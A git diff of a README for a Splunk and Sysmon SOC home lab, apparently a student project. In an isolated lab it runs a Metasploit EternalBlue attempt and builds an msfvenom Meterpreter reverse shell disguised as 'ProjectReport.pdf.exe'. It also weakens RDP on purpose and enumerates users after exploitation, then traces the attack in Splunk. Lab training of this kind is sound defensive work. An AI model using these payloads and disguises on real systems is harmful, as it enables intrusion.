@@ -1,320 +1,316 @@
-# 👨‍💻SOC Home Lab: Using Splunk & Sysmon🚀
+# 👨‍💻SOC Home Lab: Using Splunk & Sysmon🚀  
+
+## Table of Contents  
+1. [Introduction](#introduction)  
+2. [Prerequisites](#prerequisites)  
+3. [Network Topology](#network-topology)  
+4. [Step 1: Setting Up Virtual Machines](#step-1-setting-up-virtual-machines)  
+5. [Step 2: Installing Splunk for Log Monitoring](#step-2-installing-splunk-for-log-monitoring)  
+6. [Step 3: Installing Sysmon on Windows 10](#step-3-installing-sysmon-on-windows-10)  
+7. [Step 4: Generating Malware with msfvenom](#step-4-generating-malware-with-msfvenom)  
+8. [Step 5: Setting Up a Metasploit Listener](#step-5-setting-up-a-metasploit-listener)  
+9. [Step 6: Monitoring Logs with Splunk](#step-6-monitoring-logs-with-splunk)  
+10. [Troubleshooting](#troubleshooting)  
+11. [Next Steps & Future Improvements](#next-steps--future-improvements)  
+12. [How to Contribute](#how-to-contribute)  
+13. [Conclusion](#conclusion)  
+
+---  
+## 📌#Introduction  
+This project demonstrates the creation of a Security Operations Center Home (SOCHOM) Lab Environment for practicing cybersecurity attacks and monitoring. The lab simulates a realistic attack–defense scenario within an isolated network.  
+
+The setup includes:  
+💻 Windows 10 Virtual Machine – The target machine  
+🐉 Kali Linux Virtual Machine – The attacker machine  
+📊 Splunk – Security Information and Event Management (SIEM) tool for log aggregation and monitoring  
+📜 Sysmon – A system monitoring tool for detailed Windows event logging  
+
+🌐 Network Setup  
+Internal Network / LAN Segment – No internet connection, ensuring a safe and isolated testing environment  
+Both VMs communicate only within the isolated network  
+
+---  
+
+🔍 Workflow Overview  
+
+⚙️ Setup & Configuration :   
+💻 Install & configure Splunk on Windows 10  
+🛡️ Install Sysmon to capture detailed security logs  
+
+🎯 Attack Simulation :   
+🐧 Use Kali Linux & Metasploit to exploit vulnerabilities in the Windows 10 VM  
+🔓 Test both SMB-based attacks and RDP exploitation  
+
+📊 Monitoring & Detection :   
+👀 Observe attack traces in Splunk dashboards  
+📜 Analyze Sysmon logs for Indicators of Compromise (IoCs)  
+
+---  
+
+🛠 Key Highlights  
+Simulates real-world attack scenarios in a safe, isolated lab  
+Demonstrates how SOC teams detect, analyze, and respond to threats  
+Covers SMB brute-force login attempts and RDP exploitation scenarios  
+
+---  
+
+
+🔧 Prerequisites  
+
+| Requirement               | Description                                                                   |  
+| ------------------------- | ----------------------------------------------------------------------------- |  
+| **Hypervisor**            | VMware Workstation / VirtualBox (for creating and managing virtual machines)  |  
+| **Target Machine**        | **Windows 10 VM** – 5–6 GB RAM, 2 CPU cores, Internal Network (LAN Segment)   |  
+| **Attacker Machine**      | **Kali Linux VM** – 4 GB RAM, 2 CPU cores, Internal Network (LAN Segment)     |  
+| **Operating System ISOs** | Windows 10 ISO & Kali Linux ISO                                               |  
+| **Logging Tools**         | Splunk (SIEM) and Sysmon (Windows logging agent) installation files           |  
+| **Internet Connection**   | Only required initially for downloading Splunk, Sysmon, and necessary updates |  
+| **Storage**               | Sufficient disk space for two VMs and log data                                |  
+
+
+---  
+
+🌐 Network Topology  
+Below is the network topology of the SOCHOM lab environment:  
+
+   [Kali Linux VM (Attacker)]  --->  [Windows 10 VM (Target)]  
+                                        │  
+                                        ▼  
+                                  [Sysmon (Log Agent)]  
+                                        │  
+                                        ▼  
+                               [Splunk (SIEM & Monitoring)]  
+
+---  
+
+🛠️ Step 1: Environment Setup  
+Install Kali Linux (Attacker) via Kali ISO → Update & upgrade system.  
+Install Windows 10 (Target) via Windows ISO → Enable networking for VM communication.  
+Install Splunk on Windows from Splunk → Enable log collection.  
+Install Sysmon from Sysinternals using sysmonconfig.xml → Verify it’s running.  
+
+---  
+
+🌐 Step 2: 🛠 Network Configuration  
+🔌 Set VM network adapter → LAN Segment for isolated lab setup.  
+📍 Assigned static IPs:  
+🖥 Windows 10 VM → 192.168.56.2  
+💻 Kali Linux VM → 192.168.56.3  
+📡 Ensured both VMs can communicate within the lab.  
+📸 [Image placeholder: LAN Segment & IP settings]  
+
+---  
+
+🔍 Step 3: 🕵️ Initial Network Scanning  
+📤 From Kali Linux, sent ping scan → ❌ blocked by Windows Defender Firewall.  
+🛰 Ran Nmap scan → 🔒 all ports filtered.  
+🔄 From Windows 10, pinged Kali Linux → ✅ success.  
+🛑 Disabled Public Network Firewall on Windows 10 for testing.  
+📸 [Image placeholders: Nmap results & firewall settings]  
+
+---  
+
+🔍 Step 3: 🕵️ Initial Network Scanning  
+📤 From Kali Linux, sent ping scan → ❌ blocked by Windows Defender Firewall.  
+🛰 Ran Nmap scan → 🔒 all ports filtered.  
+🔄 From Windows 10, pinged Kali Linux → ✅ success.  
+🛑 Disabled Public Network Firewall on Windows 10 for testing.  
+📸 [Image placeholders: Nmap results & firewall settings]  
+
+---  
 
-## Table of Contents
-1. [Introduction](#introduction)
-2. [Prerequisites](#prerequisites)
-3. [Network Topology](#network-topology)
-4. [Step 1: Setting Up Virtual Machines](#step-1-setting-up-virtual-machines)
-5. [Step 2: Installing Splunk for Log Monitoring](#step-2-installing-splunk-for-log-monitoring)
-6. [Step 3: Installing Sysmon on Windows 10](#step-3-installing-sysmon-on-windows-10)
-7. [Step 4: Generating Malware with msfvenom](#step-4-generating-malware-with-msfvenom)
-8. [Step 5: Setting Up a Metasploit Listener](#step-5-setting-up-a-metasploit-listener)
-9. [Step 6: Monitoring Logs with Splunk](#step-6-monitoring-logs-with-splunk)
-10. [Troubleshooting](#troubleshooting)
-11. [Next Steps & Future Improvements](#next-steps--future-improvements)
-12. [How to Contribute](#how-to-contribute)
-13. [Conclusion](#conclusion)
+⚡ Step 4: 🎯 Scanning & Attempted SMB Exploitation  
+📡 Nmap scan after disabling firewall revealed open ports:  
+135 🛠 RPC  
+445 📂 SMB  
+8000 📊 Splunk Web Interface  
+8089 🔑 Splunk Management Port  
+🔍 Targeted SMB protocol (Port 445) for exploitation.  
+💣 Attempted EternalBlue (MS17-010) using Metasploit:  
+
+use exploit/windows/smb/ms17_010_eternalblue  
+set RHOSTS 192.168.56.2  
+set PAYLOAD windows/x64/meterpreter/reverse_tcp  
+set LHOST 192.168.56.3  
+set LPORT 4444  
+exploit  
 
----
-## 📌#Introduction
-This project demonstrates the creation of a Security Operations Center Home (SOCHOM) Lab Environment for practicing cybersecurity attacks and monitoring. The lab simulates a realistic attack–defense scenario within an isolated network.
-
-The setup includes :
-
-💻 Windows 10 Virtual Machine – The target machine 
-
-🐉 Kali Linux Virtual Machine – The attacker machine
-
-📊 Splunk – Security Information and Event Management (SIEM) tool for log aggregation and monitoring
-
-📜 Sysmon – A system monitoring tool for detailed Windows event logging
-
-🌐 Network Setup
-Internal Network / LAN Segment – No internet connection, ensuring a safe and isolated testing environment
-Both VMs communicate only within the isolated network
-
----
-
-## 🔍 #Workflow Overview
-
-⚙️ Setup & Configuration : 
-💻 Install & configure Splunk on Windows 10
-🛡️ Install Sysmon to capture detailed security logs
-
-🎯 Attack Simulation : 
-🐧 Use Kali Linux & Metasploit to exploit vulnerabilities in the Windows 10 VM
-🔓 Test both SMB-based attacks and RDP exploitation
-
-📊 Monitoring & Detection : 
-👀 Observe attack traces in Splunk dashboards
-📜 Analyze Sysmon logs for Indicators of Compromise (IoCs)
-
----
-
-## 🛠 #Key Highlights
-Simulates real-world attack scenarios in a safe, isolated lab
-Demonstrates how SOC teams detect, analyze, and respond to threats
-Covers SMB brute-force login attempts and RDP exploitation scenarios
-
----
-
-
-🔧 Prerequisites
-
-| Requirement               | Description                                                                   |
-| ------------------------- | ----------------------------------------------------------------------------- |
-| **Hypervisor**            | VMware Workstation / VirtualBox (for creating and managing virtual machines)  |
-| **Target Machine**        | **Windows 10 VM** – 5–6 GB RAM, 2 CPU cores, Internal Network (LAN Segment)   |
-| **Attacker Machine**      | **Kali Linux VM** – 4 GB RAM, 2 CPU cores, Internal Network (LAN Segment)     |
-| **Operating System ISOs** | Windows 10 ISO & Kali Linux ISO                                               |
-| **Logging Tools**         | Splunk (SIEM) and Sysmon (Windows logging agent) installation files           |
-| **Internet Connection**   | Only required initially for downloading Splunk, Sysmon, and necessary updates |
-| **Storage**               | Sufficient disk space for two VMs and log data                                |
-
-
----
-
-## 🌐 #Network Topology
-Below is the network topology of the SOCHOM lab environment:
-
-   [Kali Linux VM (Attacker)]  --->  [Windows 10 VM (Target)]
-                                        │
-                                        ▼
-                                  [Sysmon (Log Agent)]
-                                        │
-                                        ▼
-                               [Splunk (SIEM & Monitoring)]
-
----
-
-## 🛠️ #Step 1: Environment Setup
-Install Kali Linux (Attacker) via Kali ISO → Update & upgrade system.
-Install Windows 10 (Target) via Windows ISO → Enable networking for VM communication.
-Install Splunk on Windows from Splunk → Enable log collection.
-Install Sysmon from Sysinternals using sysmonconfig.xml → Verify it’s running.
-
----
-
-## 🌐 #Step 2: 🛠 Network Configuration
-🔌 Set VM network adapter → LAN Segment for isolated lab setup.
-📍 Assigned static IPs:
-🖥 Windows 10 VM → 192.168.56.2
-💻 Kali Linux VM → 192.168.56.3
-📡 Ensured both VMs can communicate within the lab.
-📸 [Image placeholder: LAN Segment & IP settings]
-
----
-
-## 🔍 #Step 3: 🕵️ Initial Network Scanning
-📤 From Kali Linux, sent ping scan → ❌ blocked by Windows Defender Firewall.
-🛰 Ran Nmap scan → 🔒 all ports filtered.
-🔄 From Windows 10, pinged Kali Linux → ✅ success.
-🛑 Disabled Public Network Firewall on Windows 10 for testing.
-📸 [Image placeholders: Nmap results & firewall settings]
-
----
-
-## 🔍 #Step 3: 🕵️ Initial Network Scanning
-📤 From Kali Linux, sent ping scan → ❌ blocked by Windows Defender Firewall.
-🛰 Ran Nmap scan → 🔒 all ports filtered.
-🔄 From Windows 10, pinged Kali Linux → ✅ success.
-🛑 Disabled Public Network Firewall on Windows 10 for testing.
-📸 [Image placeholders: Nmap results & firewall settings]
-
----
-
-## ⚡ #Step 4: 🎯 Scanning & Attempted SMB Exploitation
-📡 Nmap scan after disabling firewall revealed open ports:
-135 🛠 RPC
-445 📂 SMB
-8000 📊 Splunk Web Interface
-8089 🔑 Splunk Management Port
-🔍 Targeted SMB protocol (Port 445) for exploitation.
-💣 Attempted EternalBlue (MS17-010) using Metasploit:
-
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.56.2
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.56.3
-set LPORT 4444
-exploit
-
-❌ Result: No luck — Windows 10 machine was patched 🛡 and immune to the exploit.
-
-📸 [Image placeholders: Nmap showing 135, 445, 8000, 8089 | SMB exploit attempt screenshot]
-
----
-
-## 🔄 #Step 5: Creating an RDP Vulnerability 💻🔓
-Since SMB was a dead end, I decided to create my own vulnerability by enabling Remote Desktop Protocol (RDP, Port 3389) and intentionally misconfiguring it.
-
-🛠 Steps Taken:
-Enabled Remote Desktop from the system settings.
-Nmap scan still showed RDP as closed 🚫.
-🗝 Registry Tweak:
-Opened regedit → navigated to:
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
-Changed fDenyTSConnections value to 0 ✅ (enabled RDP directly from registry, bypassing GUI).
-
-🔄 Service Management:
-Located TermService (Remote Desktop Services).
-Stopped → Started → Restarted multiple times to ensure activation.
-⚙ Group Policy Configuration (gpedit.msc):
-Enabled Allow users to connect remotely under:
-Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Remote Desktop Session Host → Connections
-Ensured Network Level Authentication was disabled to reduce restrictions.
-
-📊 Final Check:
-Ran Nmap again → ✅ Port 3389 OPEN 🎉
-Ready for RDP exploitation in the next step!
-
-📸 [Image placeholders: RDP enable in settings | Registry edit screenshot | gpedit.msc config | Nmap showing 3389 open]
-
----
-
-## 🚀 #Step 6: 🎯 Payload Delivery & Exploitation Attempt
-With RDP (3389) now open 🔓, I moved on to creating and delivering a malicious payload for exploitation.
-🛠 Payload Creation (MSFvenom)
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe
-
-💡 Payload: Windows Meterpreter Reverse TCP
-📍 LHOST: Attacker machine IP
-📍 LPORT: Listener port for reverse shell
-
-📡 Setting Up the Listener (Metasploit)
-
-msfconsole
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.56.3
-set LPORT 4444
-exploit
-🎯 Waiting for the target to execute the payload...
-
-🌐 Hosting Payload with Python
-To easily transfer the file to the target, I started a Python HTTP server:
-
-python3 -m http.server 9999
-
-📂 Payload hosted at:
-http://192.168.56.3:9999/ProjectReport.pdf.exe
-📸 Result:
-Payload successfully hosted & accessible ✅
-Ready for delivery to target 🎯 (execution attempt covered in the next step)
-
-📸 [Image placeholders: MSFvenom terminal output | Metasploit listener setup | Python HTTP server running on 9999]
-
----
-
-## 🖥️ #Step 7: 🎯 Payload Delivery & Reverse Shell Gained
-💻 On Target (Windows 10):
-1️⃣ Opened browser → http://192.168.56.3:9999 🌐
-2️⃣ Downloaded projectreport.pdf 📄 (actually projectreport.pdf.exe 🐍 — .exe hidden)
-3️⃣ ⚠️ Chrome Warning: “File contains malware” — Ignored & kept file
-4️⃣ ⚠️ Windows Defender Alert: “File may be harmful” — Chose to run anyway 🛑
-
-💥 Execution & Shell Access
-Upon execution, reverse TCP connection established 🔗
-Meterpreter session opened on Kali 🎉
-
-🔍 Post-Exploitation Actions
-Inside Meterpreter:
-
-ls
-shell
-ipconfig
-ipconfig /all
-net localgroup
-net user
-
-📌 Gathered network info, checked user accounts, and enumerated privileges 👀
-
-📸 [Image placeholders: Download warning in Chrome | Meterpreter session on Kali | Commands executed]
-
----
-
-## 📊 #Step 8: Splunk Analysis of Malware Execution 🕵️‍♂️
-💡 Objective: Track malware activity (projectreport.pdf.exe) using Splunk Search & Reporting.
-🛠️ Actions Performed
-1️⃣ Opened Splunk → Search & Reporting App 📈
-2️⃣ Ran initial search:
-index=endpoint
-🔍 (endpoint was the index created earlier to store endpoint logs — including Sysmon data)
-3️⃣ Located multiple logs for system activities.
-4️⃣ Focused search to find malware traces:
-
-index=endpoint "projectreport.pdf.exe"
-📌 Found several logs related to the file execution.
-5️⃣ Opened a specific log → copied Process GUID 🆔
-6️⃣ Queried again with the GUID:
-index=endpoint "<Process_GUID>"
-📊 Retrieved detailed logs of the malware process lifecycle.
-7️⃣ Refined output with table formatting for clarity:
-index=endpoint "<Process_GUID>"
-| table _time, parent_process, image, command_line
-
-🖥️ Columns included:
-_time ⏱️ — Timestamp of event
-parent_process 🏗️ — Process that spawned this activity
-image 🖼️ — Executable file path
-command_line 💻 — Full execution command
-
-📌 Result
-✅ Successfully correlated malware file execution with process hierarchy and timeline.
-✅ Identified parent process, full path, and execution command for forensic reporting.
-
----
-
-## 🔍 #Step 9: Correlating Reverse Shell Activity with Splunk Logs 🖥️💣
-💡 Objective: Map the attacker’s actions (Meterpreter session) to endpoint telemetry collected by Splunk for full visibility.
-
-🛠️ Actions Performed
-1️⃣ From Step 7, we had a Meterpreter session opened after executing projectreport.pdf.exe.
-2️⃣ We already had the Process GUID for the malware execution from Step 8.
-This GUID was used as the pivot point to find related activity.
-3️⃣ Ran a broader search in Splunk to catch all processes spawned after the malware execution:
-
-index=endpoint "<Process_GUID>"
-OR parent_process="<Malware_Process_Path>"
-📌 This helped reveal not only the malware process but also child processes triggered by it.
-
-4️⃣ Looked specifically for commands that matched the attacker’s actions:
-ipconfig, net user, net localgroup 🧾
-These would appear in logs as part of cmd.exe or powershell.exe executions.
-5️⃣ Refined query for command-line activities:
-index=endpoint ("ipconfig" OR "net user" OR "net localgroup")
-| table _time, parent_process, image, command_line
-
-💡 This showed:
-Timestamps matching when commands were run in Meterpreter shell.
-Parent process as cmd.exe launched by the malware.
-6️⃣ Cross-checked the timeline of these events with the reverse shell timestamps in Kali Linux MSF console to validate correlation ✅.
-
-📌 Result
-✅ Successfully confirmed that the attacker’s shell commands directly originated from the malware execution process.
-✅ Created a full forensic chain:
-File Download → Execution → Reverse Shell → Commands → Detection in Splunk 🔄
-
----
-
-## 🚀 #Next Steps & Future Enhancements
-🔍 Option 1: Deploy ELK Stack for deeper, faster, and more flexible log analysis — fully customized for your environment.
-🛡️ Option 2: Deploy Wazuh SIEM (built on ELK) for advanced threat detection, automated correlation rules, and ready-made SOC dashboards.
-🐍 Use Python automation scripts to streamline the attack workflow.
-📟 Build a custom SOC dashboard that triggers real-time alerts when suspicious signatures, malware patterns, or specific attack indicators are detected — allowing analysts to respond instantly.
-
----
-
-## 🏁 #Conclusion
-Through this project, we were able to:
-🏗️ Build a fully functional cybersecurity home lab
-💣 Simulate & analyze malware-based attacks
-📊 Leverage Splunk for effective threat detection and incident investigation
-⚠️ Disclaimer: This work is strictly for educational purposes. Any unauthorized use of these methods is illegal and unethical.
-
----
-
-## 📌 #Let’s Connect
-💼 [LinkedIn](https://www.linkedin.com/in/pranavkale1124/)
-🖥️ [GitHub](https://github.com/Pranav-Kale)
+❌ Result: No luck — Windows 10 machine was patched 🛡 and immune to the exploit.  
+
+📸 [Image placeholders: Nmap showing 135, 445, 8000, 8089 | SMB exploit attempt screenshot]  
+
+---  
+
+🔄 Step 5: Creating an RDP Vulnerability 💻🔓  
+Since SMB was a dead end, I decided to create my own vulnerability by enabling Remote Desktop Protocol (RDP, Port 3389) and intentionally misconfiguring it.  
+
+🛠 Steps Taken:  
+Enabled Remote Desktop from the system settings.  
+Nmap scan still showed RDP as closed 🚫.  
+🗝 Registry Tweak:  
+Opened regedit → navigated to:  
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server  
+Changed fDenyTSConnections value to 0 ✅ (enabled RDP directly from registry, bypassing GUI).  
+
+🔄 Service Management:  
+Located TermService (Remote Desktop Services).  
+Stopped → Started → Restarted multiple times to ensure activation.  
+⚙ Group Policy Configuration (gpedit.msc):  
+Enabled Allow users to connect remotely under:  
+Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Remote Desktop Session Host → Connections  
+Ensured Network Level Authentication was disabled to reduce restrictions.  
+
+📊 Final Check:  
+Ran Nmap again → ✅ Port 3389 OPEN 🎉  
+Ready for RDP exploitation in the next step!  
+
+📸 [Image placeholders: RDP enable in settings | Registry edit screenshot | gpedit.msc config | Nmap showing 3389 open]  
+
+---  
+
+🚀 Step 6: 🎯 Payload Delivery & Exploitation Attempt  
+With RDP (3389) now open 🔓, I moved on to creating and delivering a malicious payload for exploitation.  
+🛠 Payload Creation (MSFvenom)  
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe  
+
+💡 Payload: Windows Meterpreter Reverse TCP  
+📍 LHOST: Attacker machine IP  
+📍 LPORT: Listener port for reverse shell  
+
+📡 Setting Up the Listener (Metasploit)  
+
+msfconsole  
+use exploit/multi/handler  
+set PAYLOAD windows/meterpreter/reverse_tcp  
+set LHOST 192.168.56.3  
+set LPORT 4444  
+exploit  
+🎯 Waiting for the target to execute the payload...  
+
+🌐 Hosting Payload with Python  
+To easily transfer the file to the target, I started a Python HTTP server:  
+
+python3 -m http.server 9999  
+
+📂 Payload hosted at:  
+http://192.168.56.3:9999/ProjectReport.pdf.exe  
+📸 Result:  
+Payload successfully hosted & accessible ✅  
+Ready for delivery to target 🎯 (execution attempt covered in the next step)  
+
+📸 [Image placeholders: MSFvenom terminal output | Metasploit listener setup | Python HTTP server running on 9999]  
+
+---  
+
+🖥️ Step 7: 🎯 Payload Delivery & Reverse Shell Gained  
+💻 On Target (Windows 10):  
+1️⃣ Opened browser → http://192.168.56.3:9999 🌐  
+2️⃣ Downloaded projectreport.pdf 📄 (actually projectreport.pdf.exe 🐍 — .exe hidden)  
+3️⃣ ⚠️ Chrome Warning: “File contains malware” — Ignored & kept file  
+4️⃣ ⚠️ Windows Defender Alert: “File may be harmful” — Chose to run anyway 🛑  
+
+💥 Execution & Shell Access  
+Upon execution, reverse TCP connection established 🔗  
+Meterpreter session opened on Kali 🎉  
+
+🔍 Post-Exploitation Actions  
+Inside Meterpreter:  
+
+ls  
+shell  
+ipconfig  
+ipconfig /all  
+net localgroup  
+net user  
+
+📌 Gathered network info, checked user accounts, and enumerated privileges 👀  
+
+📸 [Image placeholders: Download warning in Chrome | Meterpreter session on Kali | Commands executed]  
+
+---  
+
+📊 Step 8: Splunk Analysis of Malware Execution 🕵️‍♂️  
+💡 Objective: Track malware activity (projectreport.pdf.exe) using Splunk Search & Reporting.  
+🛠️ Actions Performed  
+1️⃣ Opened Splunk → Search & Reporting App 📈  
+2️⃣ Ran initial search:  
+index=endpoint  
+🔍 (endpoint was the index created earlier to store endpoint logs — including Sysmon data)  
+3️⃣ Located multiple logs for system activities.  
+4️⃣ Focused search to find malware traces:  
+
+index=endpoint "projectreport.pdf.exe"  
+📌 Found several logs related to the file execution.  
+5️⃣ Opened a specific log → copied Process GUID 🆔  
+6️⃣ Queried again with the GUID:  
+index=endpoint "<Process_GUID>"  
+📊 Retrieved detailed logs of the malware process lifecycle.  
+7️⃣ Refined output with table formatting for clarity:  
+index=endpoint "<Process_GUID>"  
+| table _time, parent_process, image, command_line  
+
+🖥️ Columns included:  
+_time ⏱️ — Timestamp of event  
+parent_process 🏗️ — Process that spawned this activity  
+image 🖼️ — Executable file path  
+command_line 💻 — Full execution command  
+
+📌 Result  
+✅ Successfully correlated malware file execution with process hierarchy and timeline.  
+✅ Identified parent process, full path, and execution command for forensic reporting.  
+
+---  
+
+🔍 Step 9: Correlating Reverse Shell Activity with Splunk Logs 🖥️💣  
+💡 Objective: Map the attacker’s actions (Meterpreter session) to endpoint telemetry collected by Splunk for full visibility.  
+
+🛠️ Actions Performed  
+1️⃣ From Step 7, we had a Meterpreter session opened after executing projectreport.pdf.exe.  
+2️⃣ We already had the Process GUID for the malware execution from Step 8.  
+This GUID was used as the pivot point to find related activity.  
+3️⃣ Ran a broader search in Splunk to catch all processes spawned after the malware execution:  
+
+index=endpoint "<Process_GUID>"  
+OR parent_process="<Malware_Process_Path>"  
+📌 This helped reveal not only the malware process but also child processes triggered by it.  
+
+4️⃣ Looked specifically for commands that matched the attacker’s actions:  
+ipconfig, net user, net localgroup 🧾  
+These would appear in logs as part of cmd.exe or powershell.exe executions.  
+5️⃣ Refined query for command-line activities:  
+index=endpoint ("ipconfig" OR "net user" OR "net localgroup")  
+| table _time, parent_process, image, command_line  
+
+💡 This showed:  
+Timestamps matching when commands were run in Meterpreter shell.  
+Parent process as cmd.exe launched by the malware.  
+6️⃣ Cross-checked the timeline of these events with the reverse shell timestamps in Kali Linux MSF console to validate correlation ✅.  
+
+📌 Result  
+✅ Successfully confirmed that the attacker’s shell commands directly originated from the malware execution process.  
+✅ Created a full forensic chain:  
+File Download → Execution → Reverse Shell → Commands → Detection in Splunk 🔄  
+
+---  
+
+🚀 Next Steps & Future Enhancements  
+🔍 Option 1: Deploy ELK Stack for deeper, faster, and more flexible log analysis — fully customized for your environment.  
+🛡️ Option 2: Deploy Wazuh SIEM (built on ELK) for advanced threat detection, automated correlation rules, and ready-made SOC dashboards.  
+🐍 Use Python automation scripts to streamline the attack workflow.  
+📟 Build a custom SOC dashboard that triggers real-time alerts when suspicious signatures, malware patterns, or specific attack indicators are detected — allowing analysts to respond instantly.  
+
+---  
+
+🏁 Conclusion  
+Through this project, we were able to:  
+🏗️ Build a fully functional cybersecurity home lab  
+💣 Simulate & analyze malware-based attacks  
+📊 Leverage Splunk for effective threat detection and incident investigation  
+⚠️ Disclaimer: This work is strictly for educational purposes. Any unauthorized use of these methods is illegal and unethical.  
+
+---  
+
+📌 Let’s Connect  
+💼 [LinkedIn](https://www.linkedin.com/in/pranavkale1124/)  
+🖥️ [GitHub](https://github.com/Pranav-Kale)  
